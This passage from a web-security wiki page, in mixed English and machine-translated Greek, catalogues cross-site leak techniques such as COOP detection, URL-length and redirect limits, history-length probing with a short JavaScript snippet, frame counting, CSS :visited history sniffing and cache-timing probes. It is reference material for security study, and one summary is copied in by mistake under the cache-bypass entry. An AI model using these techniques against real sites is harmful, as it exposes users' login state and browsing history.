* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Submitting a request using the Fetch API with `redirect: "manual"` and other params, it's possible to read the `response.type` attribute and if it's equals to `opaqueredirect` then the response was a redirect.

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** Οι σελίδες που προστατεύονται από την Πολιτική Ανοίγματος Διαφορετικών Προελεύσεων (COOP) αποτρέπουν την πρόσβαση από διασυνοριακές αλληλεπιδράσεις.
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

An attacker is capable of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header can be discerned by attempting to access the **`contentWindow` reference**. In scenarios where COOP is applied conditionally, the **`opener` property** becomes a telltale indicator: it's **undefined** when COOP is active, and **defined** in its absence.

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** Ανιχνεύστε τις διαφορές στις απαντήσεις επειδή το μήκος της απάντησης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο ώστε ο διακομιστής να απαντήσει με σφάλμα και να δημιουργηθεί μια ειδοποίηση.
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

If a server-side redirect uses **user input inside the redirection** and **extra data**. It's possible to detect this behaviour because usually **servers** has a **limit request length**. If the **user data** is that **length - 1**, because the **redirect** is using **that data** and **adding** something **extra**, it will trigger an **error detectable via Error Events**.

If you can somehow set cookies to a user, you can also perform this attack by **setting enough cookies** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) so with the **response increased size** of the **correct response** an **error** is triggered. In this case, remember that is you trigger this request from a same site, `<script>` will automatically send the cookies (so you can check for errors).\
An example of the **cookie bomb + XS-Search** can be found in the Intended solution of this writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` or to be in the same context is usually needed for this type of attack.

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** Ανιχνεύστε τις διαφορές στις απαντήσεις επειδή το μήκος της απάντησης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο για μια αίτηση ώστε να παρατηρηθεί μια διαφορά.
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

Therefore if the **redirect URL responded is larger in one of the cases**, it's possible to make it redirect with a **URL larger than 2MB** to hit the **length limit**. When this happens, Chrome shows an **`about:blank#blocked`** page.

The **noticeable difference**, is that if the **redirect** was **completed**, `window.origin` throws an **error** because a cross origin cannot access that info. However, if the **limit** was \*\*\*\* hit and the loaded page was **`about:blank#blocked`** the window's **`origin`** remains that of the **parent**, which is an **accessible information.**

All the extra info needed to reach the **2MB** can be added via a **hash** in the initial URL so it will be **used in the redirect**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Summary:** Χρησιμοποιήστε το όριο ανακατεύθυνσης του προγράμματος περιήγησης για να προσδιορίσετε την εμφάνιση ανακατευθύνσεων URL.
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

If the **max** number of **redirects** to follow of a browser is **20**, an attacker could try to load his page with **19 redirects** and finally **send the victim** to the tested page. If an **error** is triggered, then the page was trying to **redirect the victim**.

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** Ο κώδικας JavaScript χειρίζεται την ιστορία του προγράμματος περιήγησης και μπορεί να προσπελαστεί μέσω της ιδιότητας μήκους.
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

The **History API** allows JavaScript code to manipulate the browser history, which **saves the pages visited by a user**. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.\
**Checking `history.length`**, making a user **navigate** to a page, **change** it **back** to the same-origin and **checking** the new value of **`history.length`**.

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: If URL is the same as the guessed one
* **Summary:** Είναι δυνατόν να μαντέψετε αν η τοποθεσία ενός πλαισίου/αναδυόμενου παραθύρου είναι σε μια συγκεκριμένη διεύθυνση URL εκμεταλλευόμενοι το μήκος της ιστορίας.
* **Code Example**: Below

An attacker could use JavaScript code to **manipulate the frame/pop-up location to a guessed one** and **immediately** **change it to `about:blank`**. If the history length increased it means the URL was correct and it had time to **increase because the URL isn't reloaded if it's the same**. If it didn't increased it means it **tried to load the guessed URL** but because we **immediately after** loaded **`about:blank`**, the **history length did never increase** when loading the guessed url.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Αξιολογήστε την ποσότητα των στοιχείων iframe ελέγχοντας την ιδιότητα `window.length`.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η μέτρηση του **αριθμού των frames σε μια ιστοσελίδα** που άνοιξε μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στην αναγνώριση της **κατάστασης του χρήστη σε αυτή τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό frames, η **συνεχής** παρακολούθηση του αριθμού των frames μπορεί να βοηθήσει στην αναγνώριση ενός **μοτίβου** που μπορεί να διαρρεύσει πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο chrome, ένα **PDF** μπορεί να **ανιχνευθεί** με **μέτρηση frames** επειδή χρησιμοποιείται ένα `embed` εσωτερικά. Υπάρχουν [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιον έλεγχο πάνω στο περιεχόμενο όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική θα μπορούσε να είναι ενδιαφέρουσα.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Διαβάστε την διαρρεύσουσα τιμή για να διακρίνετε μεταξύ 2 πιθανών καταστάσεων
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω HTML στοιχείων είναι ανησυχητική στην ασφάλεια του διαδικτύου, ιδιαίτερα όταν δυναμικά αρχεία πολυμέσων δημιουργούνται με βάση τις πληροφορίες του χρήστη, ή όταν προστίθενται υδατογραφήματα, αλλάζοντας το μέγεθος των πολυμέσων. Αυτό μπορεί να εκμεταλλευτεί από επιτιθέμενους για να διακρίνουν μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που εκτίθενται από ορισμένα HTML στοιχεία.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει τη `διάρκεια` και τους `buffered` χρόνους του μέσου, οι οποίοι μπορούν να προσπελαστούν μέσω του API του. [Διαβάστε περισσότερα για το HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Αποκαλύπτει `videoHeight` και `videoWidth`. Σε ορισμένους περιηγητές, είναι διαθέσιμες πρόσθετες ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες σχετικά με το περιεχόμενο των πολυμέσων. [Διαβάστε περισσότερα για το HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένων των `totalVideoFrames`, που μπορεί να υποδεικνύει την ποσότητα των δεδομένων βίντεο που επεξεργάζονται. [Διαβάστε περισσότερα για το getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το `height` και το `width` μιας εικόνας. Ωστόσο, αν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η συνάρτηση `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας σωστά. [Διαβάστε περισσότερα για το HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Εντοπίστε παραλλαγές στο στυλ της ιστοσελίδας που σχετίζονται με την κατάσταση ή το καθεστώς του χρήστη.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Οι διαδικτυακές εφαρμογές μπορεί να αλλάξουν το **στυλ της ιστοσελίδας ανάλογα με την κατάσταση του χρήστη**. Τα CSS αρχεία διασυνοριακής προέλευσης μπορούν να ενσωματωθούν στη σελίδα του επιτιθέμενου με το **HTML link element**, και οι **κανόνες** θα **εφαρμοστούν** στη σελίδα του επιτιθέμενου. Αν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να **ανιχνεύσει** αυτές τις **διαφορές** ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική διαρροής, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να **διαβάσει CSS** ιδιότητες ενός συγκεκριμένου HTML στοιχείου. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες CSS ιδιότητες αν είναι γνωστό το επηρεαζόμενο στοιχείο και το όνομα της ιδιότητας.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Ανιχνεύστε αν το στυλ `:visited` εφαρμόζεται σε μια διεύθυνση URL υποδεικνύοντας ότι έχει ήδη επισκεφθεί
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί σε headless Chrome.
{% endhint %}

Ο CSS επιλεγέας `:visited` χρησιμοποιείται για να στυλιζάρει τις διευθύνσεις URL διαφορετικά αν έχουν επισκεφθεί προηγουμένως από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` μπορούσε να χρησιμοποιηθεί για να εντοπίσει αυτές τις διαφορές στυλ. Ωστόσο, οι σύγχρονοι περιηγητές έχουν εφαρμόσει μέτρα ασφαλείας για να αποτρέψουν αυτή τη μέθοδο από το να αποκαλύψει την κατάσταση ενός συνδέσμου. Αυτά τα μέτρα περιλαμβάνουν την επιστροφή του υπολογισμένου στυλ ως αν ο σύνδεσμος είχε επισκεφθεί και περιορίζοντας τα στυλ που μπορούν να εφαρμοστούν με τον επιλεγέα `:visited`.

Παρά αυτούς τους περιορισμούς, είναι δυνατόν να διακριθεί η επισκεφθείσα κατάσταση ενός συνδέσμου έμμεσα. Μια τεχνική περιλαμβάνει την εξαπάτηση του χρήστη να αλληλεπιδράσει με μια περιοχή που επηρεάζεται από το CSS, χρησιμοποιώντας συγκεκριμένα την ιδιότητα `mix-blend-mode`. Αυτή η ιδιότητα επιτρέπει την ανάμειξη στοιχείων με το φόντο τους, αποκαλύπτοντας ενδεχομένως την επισκεφθείσα κατάσταση με βάση την αλληλεπίδραση του χρήστη.

Επιπλέον, η ανίχνευση μπορεί να επιτευχθεί χωρίς αλληλεπίδραση του χρήστη εκμεταλλευόμενη τους χρόνους απόδοσης των συνδέσμων. Δεδομένου ότι οι περιηγητές μπορεί να αποδώσουν τους επισκεφθέντες και μη επισκεφθέντες συνδέσμους διαφορετικά, αυτό μπορεί να εισαγάγει μια μετρήσιμη χρονική διαφορά στην απόδοση. Ένα αποδεικτικό της έννοιας (PoC) αναφέρθηκε σε μια αναφορά σφάλματος του Chromium, αποδεικνύοντας αυτή την τεχνική χρησιμοποιώντας πολλαπλούς συνδέσμους για να ενισχύσει τη χρονική διαφορά, καθιστώντας έτσι την επισκεφθείσα κατάσταση ανιχνεύσιμη μέσω ανάλυσης χρόνου.

Για περισσότερες λεπτομέρειες σχετικά με αυτές τις ιδιότητες και μεθόδους, επισκεφθείτε τις σελίδες τεκμηρίωσης τους:

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Στο Google Chrome, εμφανίζεται μια ειδική σελίδα σφάλματος όταν μια σελίδα αποκλείεται από το να ενσωματωθεί σε μια διασυνοριακή τοποθεσία λόγω περιορισμών X-Frame-Options.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στο Chrome, αν μια σελίδα με την κεφαλίδα `X-Frame-Options` ρυθμισμένη σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Το Chrome επιστρέφει μοναδικά ένα κενό αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, σε αντίθεση με τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτό ανιχνεύοντας το κενό έγγραφο, αποκαλύπτοντας ενδεχομένως πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά αν οι προγραμματιστές ρυθμίζουν ασυνεπώς την κεφαλίδα X-Frame-Options, συχνά παραβλέποντας τις σελίδες σφάλματος. Η επίγνωση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι κρίσιμη για την αποτροπή τέτοιων διαρροών.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, συγκεκριμένα `Content-Disposition: attachment`, δίνει εντολή στον περιηγητή να κατεβάσει το περιεχόμενο αντί να το εμφανίσει inline. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνεύσει αν ένας χρήστης έχει πρόσβαση σε μια σελίδα που προκαλεί λήψη αρχείου. Σε περιηγητές βασισμένους στο Chromium, υπάρχουν μερικές τεχνικές για να ανιχνευθεί αυτή η συμπεριφορά λήψης:

1. **Παρακολούθηση Λωρίδας Λήψης**:
* Όταν ένα αρχείο κατεβαίνει σε περιηγητές βασισμένους στο Chromium, μια λωρίδα λήψης εμφανίζεται στο κάτω μέρος του παραθύρου του περιηγητή.
* Παρακολουθώντας τις αλλαγές στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της λωρίδας λήψης, υποδεικνύοντας ότι έχει ξεκινήσει μια λήψη.
2. **Λήψη Πλοήγησης με Iframes**:
* Όταν μια σελίδα προκαλεί λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλεί ένα γεγονός πλοήγησης.
* Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατόν να ελέγξετε αν η διάταξη περιεχομένου προκαλεί λήψη αρχείου (χωρίς πλοήγηση) ή όχι.
3. **Λήψη Πλοήγησης χωρίς Iframes**:
* Παρόμοια με την τεχνική iframe, αυτή η μέθοδος περιλαμβάνει τη χρήση του `window.open` αντί για ένα iframe.
* Η παρακολούθηση γεγονότων πλοήγησης στο νεοανοιγμένο παράθυρο μπορεί να αποκαλύψει αν προκλήθηκε λήψη αρχείου (χωρίς πλοήγηση) ή αν το περιεχόμενο εμφανίζεται inline (συμβαίνει πλοήγηση).

Σε σενάρια όπου μόνο οι συνδεδεμένοι χρήστες μπορούν να προκαλέσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να συμπεράνουν έμμεσα την κατάσταση αυθεντικοποίησης του χρήστη με βάση την αντίδραση του περιηγητή στο αίτημα λήψης.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (από [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Αυτός είναι ο λόγος που αυτή η τεχνική είναι ενδιαφέρουσα: Το Chrome έχει τώρα **κατανομή cache**, και το κλειδί cache της νεοανοιγμένης σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτήν, το κλειδί cache θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **κλειδί cache είναι διαφορετικό**, οπότε η cache δεν μπορεί να μοιραστεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Αν μια τοποθεσία `example.com` περιλαμβάνει έναν πόρο από `*.example.com/resource`, τότε αυτός ο πόρος θα έχει το **ίδιο κλειδί cache** όπως αν ο πόρος ζητήθηκε απευθείας **μέσω πλοήγησης κορυφαίου επιπέδου**. Αυτό συμβαίνει επειδή το κλειδί cache αποτελείται από το κορυφαίο _eTLD+1_ και το frame _eTLD+1_.

Δεδομένου ότι η πρόσβαση στην cache είναι ταχύτερη από τη φόρτωση ενός πόρου, είναι δυνατόν να προσπαθήσετε να αλλάξετε τη θέση μιας σελίδας και να την ακυρώσετε 20ms (για παράδειγμα) αργότερα. Αν η προέλευση άλλαξε μετά την διακοπή, σημαίνει ότι ο πόρος είχε αποθηκευτεί στην cache.\
Ή θα μπορούσατε απλώς να **στείλετε κάποιο fetch στη δυνητικά αποθηκευμένη σελίδα και να μετρήσετε τον χρόνο που απαιτείται**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Είναι δυνατόν να ανακαλύψετε αν μια απάντηση σε ένα αίτημα fetch είναι ανακατεύθυνση
* **Code Example**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Είναι δυνατόν να προσπαθήσετε να φορτώσετε έναν πόρο και πριν φορτωθεί να διακοπεί η φόρτωση. Ανάλογα με το αν προκληθεί σφάλμα, ο πόρος είχε ή δεν είχε αποθηκευτεί στην cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Χρησιμοποιήστε _**fetch**_ και _**setTimeout**_ με ένα **AbortController** για να ανιχνεύσετε αν ο **πόρος είναι αποθηκευμένος στην cache** και για να απομακρύνετε έναν συγκεκριμένο πόρο από την cache του περιηγητή. Επιπλέον, η διαδικασία συμβαίνει χωρίς την αποθήκευση νέου περιεχομένου.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Είναι δυνατόν να **επικαλύψετε ενσωματωμένες συναρτήσεις** και να διαβάσετε τα επιχειρήματά τους, ακόμη και από **cross-origin script** (το οποίο δεν μπορεί να διαβαστεί άμεσα), αυτό μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστότοπου χρησιμοποιώντας service workers.
* **Code Example**:

Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να καταχωρήσει έναν **service worker** σε μία από τις τοποθεσίες τους, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην στοχευμένη ιστοσελίδα από το κύριο έγγραφο και δίνει εντολή στον **service worker** να ξεκινήσει ένα χρονοδιακόπτη. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγεί την αναφορά που αποκτήθηκε στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **service worker**.

Κατά την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **service worker** απαντά με έναν **204 (No Content)** κωδικό κατάστασης, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **service worker** καταγράφει μια μέτρηση από τον χρονοδιακόπτη που ξεκίνησε νωρίτερα στο βήμα δύο. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

{% hint style="warning" %}
Σε μια εκτέλεση χρονομέτρησης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα χρησιμοποιώντας `window.open`. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** που υποστηρίζονται από τα **πιο προηγμένα** εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Με HTML ή Επανεισαγωγή

